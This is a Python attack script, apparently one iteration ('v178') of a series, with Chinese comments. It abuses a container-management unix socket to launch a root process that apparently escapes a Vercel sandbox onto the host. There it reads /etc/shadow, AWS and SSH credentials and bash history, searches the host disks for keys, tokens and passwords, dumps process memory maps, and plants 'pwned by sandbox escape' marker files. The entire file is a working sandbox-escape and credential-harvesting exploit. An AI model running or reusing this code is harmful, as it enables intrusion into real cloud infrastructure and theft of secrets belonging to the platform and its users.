# -*- coding: utf-8 -*-
"""v178 payload: root 后宿主盘全面侦察 - 凭据/密钥/持久化/网络
输出 /vercel/sandbox/pwn178_out.txt (容器内) + v178c.out"""
import socket, struct, time, json, os, signal, re, subprocess

OUT = '/vercel/sandbox/v178c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(275)

R = '/proc/1/root'
CELL = R + '/run/cell/cell.sock'
CTRS = '/vercel.hive.cell.api.containers.v1.ContainersService'
PWN = '/vercel/sandbox/pwn178.py'
PWNOUT = '/vercel/sandbox/pwn178_out.txt'


def log(s, maxlen=450):
    s = str(s)
    if len(s) > maxlen:
        s = s[:maxlen] + '...[TRUNC %d]' % len(s)
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def raw_req(sockpath, path, body, t=5.0, ctype='application/json'):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n'
               % (path, ctype, len(body))).encode() + body
        s.sendall(req)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
        except Exception:
            pass
        s.close()
        st = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        hdr_end = d.find(b'\r\n\r\n')
        return st, d[hdr_end + 4:hdr_end + 4 + 1000] if hdr_end > 0 else b''
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''


PWN_CODE = r'''#!/usr/bin/python3
import os, sys, re, subprocess
OUT = '/vercel/sandbox/pwn178_out.txt'
def w(s):
    try:
        with open(OUT, 'a') as ff:
            ff.write(str(s) + '\n')
    except Exception:
        pass
def rd(p, n=2000):
    try:
        d = open(p, 'rb').read(n)
        return '%r' % d[:n]
    except Exception as e:
        return 'EXC %s' % e
os.setgid(0); os.setuid(0)
w('ROOT uid=%d' % os.getuid())

# 1. 宿主文件系统全览
for p in ['/mnt/etc/shadow', '/mnt/etc/passwd', '/mnt/etc/hostname',
          '/mnt/etc/containerd/config.toml', '/mnt/etc/aws/credentials',
          '/mnt/root/.ssh/authorized_keys', '/mnt/root/.aws/credentials',
          '/mnt/root/.bash_history']:
    w('RD %s -> %s' % (p, rd(p, 1500)))

# 2. 关键目录枚举
for d in ['/mnt/root', '/mnt/home', '/mnt/opt', '/mnt/var/lib/containerd',
          '/mnt/var/lib', '/mnt/var/run/cell', '/mnt/usr/local', '/mnt/srv']:
    try:
        if os.path.isdir(d):
            lst = sorted(os.listdir(d))[:40]
            w('LS %s (%d): %r' % (d, len(os.listdir(d)), lst))
        else:
            w('LS %s MISSING' % d)
    except Exception as e:
        w('LS %s EXC %s' % (d, e))

# 3. 全盘 grep 敏感关键词 (限 /mnt/etc /mnt/opt /mnt/root /mnt/var)
kws = [b'AWS_', b'aws_secret', b'AKIA', b'token', b'secret', b'BEGIN.*PRIVATE KEY',
       b'password', b'api_key', b'apikey', b'authorization', b'Bearer ']
for base in ['/mnt/etc', '/mnt/opt', '/mnt/root', '/mnt/var']:
    hits = 0
    for root, dirs, files in os.walk(base):
        if hits > 30:
            break
        # 跳过噪音目录
        if any(x in root for x in ['/proc', '/sys', '/dev', 'node_modules', '/cache', '/log']):
            dirs[:] = []
            continue
        if root.count('/') > 7:
            dirs[:] = []
            continue
        try:
            dirs.sort()
        except Exception:
            pass
        for fn in files:
            if hits > 30:
                break
            try:
                p = os.path.join(root, fn)
                if os.path.getsize(p) > 2 * 1024 * 1024:
                    continue
                data = open(p, 'rb').read(1024 * 1024)
                for kw in kws:
                    if kw in data:
                        i = data.find(kw)
                        w('GREP %s %r @%d: %r' % (p, kw, i, data[max(0, i - 40):i + 120]))
                        hits += 1
                        break
            except Exception:
                pass

# 4. sandbox-init 进程内存映射 (找私钥/配置)
try:
    for pid in ['577']:
        try:
            maps = open('/proc/%s/maps' % pid).read()
            w('MAPS %s:\n%s' % (pid, maps[:3000]))
        except Exception as e:
            w('MAPS %s EXC %s' % (pid, e))
except Exception as e:
    w('MAPS EXC %s' % e)

# 5. 持久化验证 (无害标记)
for p in ['/mnt/root/pwn178_marker', '/mnt/tmp/pwn178_marker']:
    try:
        open(p, 'w').write('pwned by sandbox escape ' + str(os.getpid()))
        w('WRITE %s OK' % p)
    except Exception as e:
        w('WRITE %s EXC %s' % (p, e))

# 6. 网络完整视图 (root)
try:
    w('ROUTE:\n' + open('/proc/net/route').read())
except Exception as e:
    w('ROUTE EXC %s' % e)
try:
    w('IPV6 ROUTE:\n' + open('/proc/net/ipv6_route').read()[:2000])
except Exception as e:
    w('IPV6 EXC %s' % e)
try:
    w('LISTEN TCP:\n' + open('/proc/net/tcp').read())
except Exception as e:
    w('TCP EXC %s' % e)
try:
    w('LISTEN TCP6:\n' + open('/proc/net/tcp6').read()[:3000])
except Exception as e:
    w('TCP6 EXC %s' % e)
try:
    w('ARP:\n' + open('/proc/net/arp').read())
except Exception as e:
    w('ARP EXC %s' % e)

# 7. cgroup 信息
try:
    w('CGROUP:\n' + open('/proc/self/cgroup').read())
except Exception as e:
    w('CGROUP EXC %s' % e)

# 8. containerd 状态 (root 视角)
try:
    w('CTRD CONTAINERS: ' + rd('/mnt/var/lib/containerd', 500))
except Exception as e:
    w('CTRD EXC %s' % e)

w('PWN178_DONE')
'''

# ============ 1: 写 pwn 脚本 ============
log('=== 1 write ===')
try:
    open(PWN, 'w').write(PWN_CODE)
    os.chmod(PWN, 0o755)
    log('pwn written %d' % os.path.getsize(PWN))
except Exception as e:
    log('PWN EXC %s' % e)

# ============ 2: Create + Start ============
log('=== 2 create ===')
st, pay = raw_req(CELL, '%s/Create' % CTRS,
                  json.dumps({'drive_id': 'sandbox', 'command': PWN}).encode(), t=8)
log('Create -> %s %r' % (st, pay[:150]))
m = re.search(rb'containerId["\s:]+([A-Za-z0-9_-]+)', pay)
cid = m.group(1).decode() if m else ''
if cid:
    st2, pay2 = raw_req(CELL, '%s/Start' % CTRS, json.dumps({'container_id': cid}).encode(), t=8)
    log('Start -> %s %r' % (st2, pay2[:100]))

# ============ 3: 轮询 ============
log('=== 3 poll ===')
t0 = time.time()
seen = ''
while time.time() - t0 < 30:
    time.sleep(0.5)
    try:
        if os.path.exists(PWNOUT):
            cur = open(PWNOUT, errors='replace').read()
            if cur != seen:
                seg = cur[len(seen):] if cur.startswith(seen) else cur
                seen = cur
                # 分段输出
                for i in range(0, len(seg), 4000):
                    log('PWN +%d:\n%s' % (i, seg[i:i + 4000]))
            if 'PWN178_DONE' in cur:
                break
    except Exception as e:
        log('POLL EXC %s' % e)
log('poll end %d' % len(seen))

log('V178_DONE')
f.close()
